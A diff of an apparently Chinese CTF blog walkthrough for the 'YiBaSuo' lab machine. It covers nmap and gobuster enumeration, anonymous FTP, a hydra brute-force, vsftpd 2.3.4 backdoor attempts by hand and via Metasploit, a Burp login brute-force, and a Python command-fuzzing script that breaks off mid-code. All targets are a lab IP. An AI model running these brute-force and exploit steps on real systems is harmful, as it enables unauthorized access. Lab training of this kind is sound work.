@@ -289,7 +289,7 @@ root:fakepass
 <meta property="og:url" content="https://pingsag3.github.io/post/qun-zhu-ba-ji-%EF%BC%9AYiBaSuo%2020250621.html">
 <meta property="og:image" content="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg">
 <title>群主靶机：YiBaSuo 20250621</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -360,56 +360,58 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 https://maze-sec.com/library
 https://hackmyvm.eu/machines/machine.php?vm=
 </code></pre>
-<div class="highlight highlight-source-shell"><pre class="notranslate">难度：⭐️⭐️
-知识点：信息收集，<span class="pl-s"><span class="pl-pds">`</span>VSFTPD 2.3.4<span class="pl-pds">`</span></span>,<span class="pl-s"><span class="pl-pds">`</span>Ftp笑脸漏洞<span class="pl-pds">`</span></span>，<span class="pl-s"><span class="pl-pds">`</span>burp<span class="pl-pds">`</span></span>爆破，弱密码生成，<span class="pl-s"><span class="pl-pds">`</span>hydra<span class="pl-pds">`</span></span>爆破,<span class="pl-s"><span class="pl-pds">`</span>bash<span class="pl-pds">`</span></span>提权</pre></div>
+<pre lang="shell" class="notranslate"><code class="notranslate">难度：⭐️⭐️
+知识点：信息收集，`VSFTPD 2.3.4`,`Ftp笑脸漏洞`，`burp`爆破，弱密码生成，`hydra`爆破,`bash`提权
+</code></pre>
 <h3>2. 信息收集</h3>
 <h3>Nmap</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> arp-scan -l | grep PCS</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# arp-scan -l | grep PCS
 192.168.31.10   08:00:27:9f:f6:73       PCS Systemtechnik GmbH
-└─<span class="pl-c"><span class="pl-c">#</span> IP=192.168.31.10</span>
-└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -A $IP -Pn</span>
-└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -A $IP -P</span>
+└─# IP=192.168.31.10
+└─# nmap -sV -sC -A $IP -Pn
+└─# nmap -sV -sC -A $IP -P
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 08:03 CST
-Nmap scan report <span class="pl-k">for</span> Yibasuo (192.168.31.10)
+Nmap scan report for Yibasuo (192.168.31.10)
 Host is up (0.0018s latency).
 Not shown: 997 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 2.3.4
-<span class="pl-k">|</span> ftp-syst:
-<span class="pl-k">|</span>   STAT:
-<span class="pl-k">|</span> FTP server status:
-<span class="pl-k">|</span>      Connected to 192.168.31.126
-<span class="pl-k">|</span>      Logged <span class="pl-k">in</span> as ftp
-<span class="pl-k">|</span>      TYPE: ASCII
-<span class="pl-k">|</span>      No session bandwidth limit
-<span class="pl-k">|</span>      Session timeout <span class="pl-k">in</span> seconds is 300
-<span class="pl-k">|</span>      Control connection is plain text
-<span class="pl-k">|</span>      Data connections will be plain text
-<span class="pl-k">|</span>      At session startup, client count was 1
-<span class="pl-k">|</span>      vsFTPd 2.3.4 - secure, fast, stable
-<span class="pl-k">|</span>_End of status
-<span class="pl-k">|</span> ftp-anon: Anonymous FTP login allowed (FTP code 230)
-<span class="pl-k">|</span>_-rw-r--r--    1 0        0              14 Jun 17 13:41 creds.txt
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 192.168.31.126
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0              14 Jun 17 13:41 creds.txt
 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
-<span class="pl-k">|</span> ssh-hostkey:
-<span class="pl-k">|</span>   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
-<span class="pl-k">|</span>   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
-<span class="pl-k">|</span>_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
-80/tcp open  http    Apache httpd 2.4.62 <span class="pl-s"><span class="pl-pds">((</span>Debian<span class="pl-pds">))</span></span>
-<span class="pl-k">|</span>_http-server-header: Apache/2.4.62 (Debian)
-<span class="pl-k">|</span> http-cookie-flags:
-<span class="pl-k">|</span>   /:
-<span class="pl-k">|</span>     PHPSESSID:
-<span class="pl-k">|</span>_      httponly flag not <span class="pl-c1">set</span>
-<span class="pl-k">|</span>_http-title: Linux<span class="pl-cce">\x</span>E9<span class="pl-cce">\x</span>9D<span class="pl-cce">\x</span>B6<span class="pl-cce">\x</span>E6<span class="pl-cce">\x</span>9C<span class="pl-cce">\x</span>BA<span class="pl-cce">\x</span>E5<span class="pl-cce">\x</span>85<span class="pl-cce">\x</span>A5<span class="pl-cce">\x</span>E5<span class="pl-cce">\x</span>8F<span class="pl-cce">\x</span>A3
-MAC Address: 08:00:27:9F:F6:73 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</pre></div>
+| ssh-hostkey:
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache/2.4.62 (Debian)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-title: Linux\xE9\x9D\xB6\xE6\x9C\xBA\xE5\x85\xA5\xE5\x8F\xA3
+MAC Address: 08:00:27:9F:F6:73 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+</code></pre>
 <p>开放了<code class="notranslate">21、22、80</code>端口,先看看<code class="notranslate">21</code>有啥东西</p>
 <h3>3.目录扫描</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> dirsearch -u http://$IP  -x 403 -e txt,php,html</span>
-└─<span class="pl-c"><span class="pl-c">#</span> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
+└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html
 ===============================================================
 Gobuster v3.6
-by OJ Reeves (@TheColonial) <span class="pl-k">&amp;</span> Christian Mehlmauer (@firefart)
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 ===============================================================
 [+] Url:                     http://192.168.31.10
 [+] Method:                  GET
@@ -420,51 +422,54 @@ by OJ Reeves (@TheColonial) <span class="pl-k">&amp;</span> Christian Mehlmauer 
 [+] Extensions:              html,txt,php
 [+] Timeout:                 10s
 ===============================================================
-Starting gobuster <span class="pl-k">in</span> directory enumeration mode
+Starting gobuster in directory enumeration mode
 ===============================================================
 /.php                 (Status: 403) [Size: 278]
 /.html                (Status: 403) [Size: 278]
 /index.php            (Status: 200) [Size: 4087]
 /info.php             (Status: 200) [Size: 85750]
-/secure               (Status: 301) [Size: 315] [--<span class="pl-k">&gt;</span> http://192.168.31.10/secure/]
+/secure               (Status: 301) [Size: 315] [--&gt; http://192.168.31.10/secure/]
 /.php                 (Status: 403) [Size: 278]
 /.html                (Status: 403) [Size: 278]
 /server-status        (Status: 403) [Size: 278]
-Progress: 882236 / 882240 (100.00%)</pre></div>
+Progress: 882236 / 882240 (100.00%)
+</code></pre>
 <p>习惯性扫目录没啥有用信息，访问主页是个登陆页面</p>
 <h3>4.<code class="notranslate">ftp</code>测试</h3>
 <p>有<code class="notranslate">ftp anonymous@$IP</code>登陆后,有个提示信息<code class="notranslate">root:fakepass</code></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> ftp anonymous@$IP</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# ftp anonymous@$IP
 Connected to 192.168.31.10.
 220 (vsFTPd 2.3.4)
 331 Please specify the password.
-Password:<span class="pl-c"><span class="pl-c">#</span>直接回车</span>
+Password:#直接回车
 230 Login successful.
-ftp<span class="pl-k">&gt;</span> ls -artl
-229 Entering Extended Passive Mode (<span class="pl-k">|||</span>7793<span class="pl-k">|</span>).
+ftp&gt; ls -artl
+229 Entering Extended Passive Mode (|||7793|).
 150 Here comes the directory listing.
 -rw-r--r--    1 0        0              14 Jun 17 13:41 creds.txt
-drwxr-xr-x    2 0        0            4096 Jun 17 13:41 <span class="pl-c1">.</span>
+drwxr-xr-x    2 0        0            4096 Jun 17 13:41 .
 drwxr-xr-x    2 0        0            4096 Jun 17 13:41 ..
 226 Directory send OK.
-ftp<span class="pl-k">&gt;</span> get creds.txt
+ftp&gt; get creds.txt
 local: creds.txt remote: creds.txt
-229 Entering Extended Passive Mode (<span class="pl-k">|||</span>17086<span class="pl-k">|</span>).
-150 Opening BINARY mode data connection <span class="pl-k">for</span> creds.txt (14 bytes).
-100% <span class="pl-k">|</span><span class="pl-k">***************************************************************************</span><span class="pl-k">|</span>    14       31.72 KiB/s    00:00 ETA
+229 Entering Extended Passive Mode (|||17086|).
+150 Opening BINARY mode data connection for creds.txt (14 bytes).
+100% |***************************************************************************|    14       31.72 KiB/s    00:00 ETA
 226 Transfer complete.
-14 bytes received <span class="pl-k">in</span> 00:00 (6.00 KiB/s)
+14 bytes received in 00:00 (6.00 KiB/s)
 
-└─<span class="pl-c"><span class="pl-c">#</span> cat creds.txt</span>
-root:fakepass</pre></div>
+└─# cat creds.txt
+root:fakepass
+</code></pre>
 <p>直接拿给的账号密码<code class="notranslate">root:fakepass</code>去登陆网页、ftp、ssh登陆均失败，先<code class="notranslate">hydra</code>爆破一下弱密码</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> hydra -l root  -P /usr/share/wordlists/rockyou.txt ftp://$IP  -V -I -u -f -e nsr</span></pre></div>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# hydra -l root  -P /usr/share/wordlists/rockyou.txt ftp://$IP  -V -I -u -f -e nsr
+</code></pre>
 <p>测试一圈没得用，给出的提示信息是个烟雾弹</p>
 <h5>Ftp笑脸漏洞（VSFTPD 2.3.4）复现（后门漏洞）</h5>
 <p>注意到<code class="notranslate">VSFTPD 2.3.4</code>有个<code class="notranslate">Ftp笑脸漏洞（VSFTPD 2.3.4）</code>，如果<code class="notranslate">FTP</code>认证时的用户名包含特殊字符“<code class="notranslate">:)</code>”，服务器会自动打开<code class="notranslate">6200</code>端口，并在该端口上提供一个<code class="notranslate">root</code>权限的<code class="notranslate">shell</code>。攻击者可以通过连接该端口，直接以<code class="notranslate">root</code>身份登录目标服务器.</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">利用netcat，连接靶机的21端口，输入user带有 :) ，pass随便输入
-<span class="pl-c"><span class="pl-c">#</span>直接测试会卡住没反应，提示超时</span>
-└─<span class="pl-c"><span class="pl-c">#</span> ftp $IP</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">利用netcat，连接靶机的21端口，输入user带有 :) ，pass随便输入
+#直接测试会卡住没反应，提示超时
+└─# ftp $IP
 Connected to 192.168.31.10.
 220 (vsFTPd 2.3.4)
 Name (192.168.31.10:root): 123 :)
@@ -473,45 +478,47 @@ Password:
 
 421 Service not available, remote server timed out. Connection closed.
 ftp: Login failed
-<span class="pl-c"><span class="pl-c">#</span></span>
-└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC $IP -p 6200</span>
+#
+└─# nmap -sV -sC $IP -p 6200
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-22 07:53 CST
-Nmap scan report <span class="pl-k">for</span> Yibasuo (192.168.31.10)
+Nmap scan report for Yibasuo (192.168.31.10)
 Host is up (0.0011s latency).
 
 PORT     STATE    SERVICE VERSION
 6200/tcp filtered lm-x
 MAC Address: 08:00:27:9F:F6:73 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
-</pre></div>
+
+</code></pre>
 <p><code class="notranslate">输入user带有 :)</code>测试后，再扫描<code class="notranslate">6200</code>端口显示<code class="notranslate">filtered</code>，说明漏洞已经被利用，但是<code class="notranslate">6200</code>端口防火墙等手段给禁用了,不能远程一把嗦</p>
 <h5><code class="notranslate">msf</code>一把嗦</h5>
-<div class="highlight highlight-source-shell"><pre class="notranslate">msf6 <span class="pl-k">&gt;</span> search vsftpd 2.3.4
+<pre lang="shell" class="notranslate"><code class="notranslate">msf6 &gt; search vsftpd 2.3.4
 Matching Modules
 ================
 
-   <span class="pl-c"><span class="pl-c">#</span>  Name                                  Disclosure Date  Rank       Check  Description</span>
+   #  Name                                  Disclosure Date  Rank       Check  Description
    -  ----                                  ---------------  ----       -----  -----------
    0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
 
 Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
 
-msf6 <span class="pl-k">&gt;</span> use 0
-[<span class="pl-k">*</span>] No payload configured, defaulting to cmd/unix/interact
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) <span class="pl-k">&gt;</span> show options
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> RHOSTS 192.168.31.10
-RHOSTS =<span class="pl-k">&gt;</span> 192.168.31.10
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) <span class="pl-k">&gt;</span> run
+msf6 &gt; use 0
+[*] No payload configured, defaulting to cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set RHOSTS 192.168.31.10
+RHOSTS =&gt; 192.168.31.10
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; run
 
-[<span class="pl-k">*</span>] 192.168.31.10:21 - Banner: 220 (vsFTPd 2.3.4)
-[<span class="pl-k">*</span>] 192.168.31.10:21 - USER: 331 Please specify the password.
-[<span class="pl-k">*</span>] Exploit completed, but no session was created.
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) <span class="pl-k">&gt;</span></pre></div>
+[*] 192.168.31.10:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.31.10:21 - USER: 331 Please specify the password.
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt;
+</code></pre>
 <p>再用<code class="notranslate">msf</code>测试也不能一把嗦建立会话</p>
 <h3>5.获得<code class="notranslate">www-data</code>权限</h3>
 <p><code class="notranslate">Ftp笑脸漏洞（VSFTPD 2.3.4）</code>不能一把嗦，只有老老实实去<code class="notranslate">web</code>爆破账户信息</p>
 <h5><code class="notranslate">burp</code>抓包爆破</h5>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>burp抓包后去爆破admin的密码</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">#burp抓包后去爆破admin的密码
 POST / HTTP/1.1
 Host: 192.168.31.10
 Content-Length: 29
@@ -519,22 +526,23 @@ Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 Origin: http://192.168.31.10
 Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0<span class="pl-k">;</span> Win64<span class="pl-k">;</span> x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml<span class="pl-k">;</span>q=0.9,image/avif,image/webp,image/apng,<span class="pl-k">*</span>/<span class="pl-k">*</span><span class="pl-k">;</span>q=0.8,application/signed-exchange<span class="pl-k">;</span>v=b3<span class="pl-k">;</span>q=0.7
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Referer: http://192.168.31.10/
 Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh<span class="pl-k">;</span>q=0.9
+Accept-Language: zh-CN,zh;q=0.9
 Cookie: PHPSESSID=r65m2emt9k6h6jh84ta0sito44
 Connection: close
 
-username=admin<span class="pl-k">&amp;</span>password=§admin§</pre></div>
+username=admin&amp;password=§admin§
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/8b22a1593d47d852d44f18e50ab4dc6d164ee814053401dd5622a9b6a52db78e/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303632323038303731373838312e706e67"><img src="https://camo.githubusercontent.com/8b22a1593d47d852d44f18e50ab4dc6d164ee814053401dd5622a9b6a52db78e/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303632323038303731373838312e706e67" alt="image-20250622080717881" data-canonical-src="https://gitee.com/shui666/images/raw/master/images/image-20250622080717881.png" style="max-width: 100%;"></a></p>
 <p>拿到<code class="notranslate">web</code>登陆后台账号<code class="notranslate">admin/password123</code>,登录后可以执行命令，但是只能执行一部分</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/67842e4e0ad87f1bfc447bb6323085aae929540890069e9530b39b66a17923c0/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303632323038313031353036332e706e67"><img src="https://camo.githubusercontent.com/67842e4e0ad87f1bfc447bb6323085aae929540890069e9530b39b66a17923c0/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303632323038313031353036332e706e67" alt="image-20250622081015063" data-canonical-src="https://gitee.com/shui666/images/raw/master/images/image-20250622081015063.png" style="max-width: 100%;"></a></p>
 <p>先构造个命令字典<code class="notranslate">cmd.txt</code>，群主分享了简单方法直接去<code class="notranslate">kali</code>的<code class="notranslate">/usr/bin</code>目录取关键字</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> ls /usr/bin | xargs -n1 &gt; cmd.txt</span>
-└─<span class="pl-c"><span class="pl-c">#</span> cp cmd.txt /mnt/c/Users/family/Desktop/</span>
-<span class="pl-c"><span class="pl-c">#</span>burp爆破</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# ls /usr/bin | xargs -n1 &gt; cmd.txt
+└─# cp cmd.txt /mnt/c/Users/family/Desktop/
+#burp爆破
 POST /secure/ HTTP/1.1
 Host: 192.168.31.10
 Content-Length: 10
@@ -542,88 +550,90 @@ Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 Origin: http://192.168.31.10
 Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0<span class="pl-k">;</span> Win64<span class="pl-k">;</span> x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml<span class="pl-k">;</span>q=0.9,image/avif,image/webp,image/apng,<span class="pl-k">*</span>/<span class="pl-k">*</span><span class="pl-k">;</span>q=0.8,application/signed-exchange<span class="pl-k">;</span>v=b3<span class="pl-k">;</span>q=0.7
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Referer: http://192.168.31.10/secure/
 Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh<span class="pl-k">;</span>q=0.9
+Accept-Language: zh-CN,zh;q=0.9
 Cookie: PHPSESSID=r65m2emt9k6h6jh84ta0sito44
 Connection: close
 
-command=§id§</pre></div>
+command=§id§
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a3065f6b6f918fd9efdc86b32bb0698b72d8f77ec9aadbeffad8f9f2d34d03dc/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303632323038323934383935322e706e67"><img src="https://camo.githubusercontent.com/a3065f6b6f918fd9efdc86b32bb0698b72d8f77ec9aadbeffad8f9f2d34d03dc/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303632323038323934383935322e706e67" alt="image-20250622082948952" data-canonical-src="https://gitee.com/shui666/images/raw/master/images/image-20250622082948952.png" style="max-width: 100%;"></a></p>
 <p>也可以让<code class="notranslate">AI</code>写一个``python`脚本</p>
-<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">requests</span>
-<span class="pl-k">import</span> <span class="pl-s1">sys</span>
+<pre lang="python" class="notranslate"><code class="notranslate">import requests
+import sys
 
-<span class="pl-c"># 配置信息</span>
-<span class="pl-s1">url</span> <span class="pl-c1">=</span> <span class="pl-s">"http://192.168.31.10/secure/"</span>
-<span class="pl-s1">dict_path</span> <span class="pl-c1">=</span> <span class="pl-s">r"c:/Users/family/Desktop/cmd.txt"</span>
-<span class="pl-s1">success_results</span> <span class="pl-c1">=</span> []
+# 配置信息
+url = "http://192.168.31.10/secure/"
+dict_path = r"c:/Users/family/Desktop/cmd.txt"
+success_results = []
 
-<span class="pl-c"># 从Burp抓包中提取的请求头</span>
-<span class="pl-s1">headers</span> <span class="pl-c1">=</span> {
-    <span class="pl-s">"Host"</span>: <span class="pl-s">"192.168.31.10"</span>,
-    <span class="pl-s">"Cache-Control"</span>: <span class="pl-s">"max-age=0"</span>,
-    <span class="pl-s">"Upgrade-Insecure-Requests"</span>: <span class="pl-s">"1"</span>,
-    <span class="pl-s">"Origin"</span>: <span class="pl-s">"http://192.168.31.10"</span>,
-    <span class="pl-s">"Content-Type"</span>: <span class="pl-s">"application/x-www-form-urlencoded"</span>,
-    <span class="pl-s">"User-Agent"</span>: <span class="pl-s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36"</span>,
-    <span class="pl-s">"Accept"</span>: <span class="pl-s">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"</span>,
-    <span class="pl-s">"Referer"</span>: <span class="pl-s">"http://192.168.31.10/secure/"</span>,
-    <span class="pl-s">"Accept-Encoding"</span>: <span class="pl-s">"gzip, deflate"</span>,
-    <span class="pl-s">"Accept-Language"</span>: <span class="pl-s">"zh-CN,zh;q=0.9"</span>,
-    <span class="pl-s">"Cookie"</span>: <span class="pl-s">"PHPSESSID=r65m2emt9k6h6jh84ta0sito44"</span>,
-    <span class="pl-s">"Connection"</span>: <span class="pl-s">"close"</span>
+# 从Burp抓包中提取的请求头
+headers = {
+    "Host": "192.168.31.10",
+    "Cache-Control": "max-age=0",
+    "Upgrade-Insecure-Requests": "1",
+    "Origin": "http://192.168.31.10",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "Referer": "http://192.168.31.10/secure/",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept-Language": "zh-CN,zh;q=0.9",
+    "Cookie": "PHPSESSID=r65m2emt9k6h6jh84ta0sito44",
+    "Connection": "close"
 }
 
-<span class="pl-k">try</span>:
-    <span class="pl-c"># 读取字典文件</span>
-    <span class="pl-k">with</span> <span class="pl-en">open</span>(<span class="pl-s1">dict_path</span>, <span class="pl-s">'r'</span>, <span class="pl-s1">encoding</span><span class="pl-c1">=</span><span class="pl-s">'utf-8'</span>) <span class="pl-k">as</span> <span class="pl-s1">f</span>:
-        <span class="pl-s1">commands</span> <span class="pl-c1">=</span> [<span class="pl-s1">line</span>.<span class="pl-c1">strip</span>() <span class="pl-k">for</span> <span class="pl-s1">line</span> <span class="pl-c1">in</span> <span class="pl-s1">f</span>.<span class="pl-c1">readlines</span>() <span class="pl-k">if</span> <span class="pl-s1">line</span>.<span class="pl-c1">strip</span>()]
+try:
+    # 读取字典文件
+    with open(dict_path, 'r', encoding='utf-8') as f:
+        commands = [line.strip() for line in f.readlines() if line.strip()]
 
-    <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">commands</span>:
-        <span class="pl-en">print</span>(<span class="pl-s">"[!] 字典文件为空！"</span>)
-        <span class="pl-s1">sys</span>.<span class="pl-c1">exit</span>(<span class="pl-c1">1</span>)
+    if not commands:
+        print("[!] 字典文件为空！")
+        sys.exit(1)
 
-    <span class="pl-en">print</span>(<span class="pl-s">f"[*] 加载 <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">len</span>(<span class="pl-s1">commands</span>)<span class="pl-kos">}</span></span> 条命令，开始爆破..."</span>)
+    print(f"[*] 加载 {len(commands)} 条命令，开始爆破...")
 
-    <span class="pl-c"># 遍历命令字典</span>
-    <span class="pl-k">for</span> <span class="pl-s1">i</span>, <span class="pl-s1">cmd</span> <span class="pl-c1">in</span> <span class="pl-en">enumerate</span>(<span class="pl-s1">commands</span>, <span class="pl-c1">1</span>):
-        <span class="pl-k">try</span>:
-            <span class="pl-s1">data</span> <span class="pl-c1">=</span> {<span class="pl-s">"command"</span>: <span class="pl-s1">cmd</span>}
-            <span class="pl-s1">resp</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-c1">post</span>(
-                <span class="pl-s1">url</span>,
-                <span class="pl-s1">headers</span><span class="pl-c1">=</span><span class="pl-s1">headers</span>,
-                <span class="pl-s1">data</span><span class="pl-c1">=</span><span class="pl-s1">data</span>,
-                <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">10</span>
+    # 遍历命令字典
+    for i, cmd in enumerate(commands, 1):
+        try:
+            data = {"command": cmd}
+            resp = requests.post(
+                url,
+                headers=headers,
+                data=data,
+                timeout=10
             )
 
-            <span class="pl-c"># 过滤包含"未授权的命令"的响应</span>
-            <span class="pl-k">if</span> <span class="pl-s">"未授权的命令"</span> <span class="pl-c1"><span class="pl-c1">not</span> <span class="pl-c1">in</span></span> <span class="pl-s1">resp</span>.<span class="pl-c1">text</span>:
-                <span class="pl-s1">success_results</span>.<span class="pl-c1">append</span>((<span class="pl-s1">cmd</span>, <span class="pl-s1">resp</span>.<span class="pl-c1">text</span>))
-                <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-cce">\n</span>[+] 成功命令: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">cmd</span><span class="pl-kos">}</span></span>"</span>)
-                <span class="pl-c">#print(f"[*] 响应内容:\n{resp.text[:500]}...")  # 截取前500字符</span>
-            <span class="pl-k">else</span>:
-                <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-cce">\r</span>[-] 测试进度: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">i</span><span class="pl-kos">}</span></span>/<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">len</span>(<span class="pl-s1">commands</span>)<span class="pl-kos">}</span></span> | 当前命令: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">cmd</span>.<span class="pl-c1">ljust</span>(<span class="pl-c1">20</span>)<span class="pl-kos">}</span></span>"</span>, <span class="pl-s1">end</span><span class="pl-c1">=</span><span class="pl-s">''</span>)
+            # 过滤包含"未授权的命令"的响应
+            if "未授权的命令" not in resp.text:
+                success_results.append((cmd, resp.text))
+                print(f"\n[+] 成功命令: {cmd}")
+                #print(f"[*] 响应内容:\n{resp.text[:500]}...")  # 截取前500字符
+            else:
+                print(f"\r[-] 测试进度: {i}/{len(commands)} | 当前命令: {cmd.ljust(20)}", end='')
 
-        <span class="pl-k">except</span> <span class="pl-v">Exception</span> <span class="pl-k">as</span> <span class="pl-s1">e</span>:
-            <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-cce">\n</span>[!] 命令 '<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">cmd</span><span class="pl-kos">}</span></span>' 请求失败: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">str</span>(<span class="pl-s1">e</span>)<span class="pl-kos">}</span></span>"</span>)
+        except Exception as e:
+            print(f"\n[!] 命令 '{cmd}' 请求失败: {str(e)}")
 
-    <span class="pl-c"># 输出最终结果</span>
-    <span class="pl-en">print</span>(<span class="pl-s">"<span class="pl-cce">\n</span><span class="pl-cce">\n</span>爆破完成！结果汇总："</span>)
-    <span class="pl-k">if</span> <span class="pl-s1">success_results</span>:
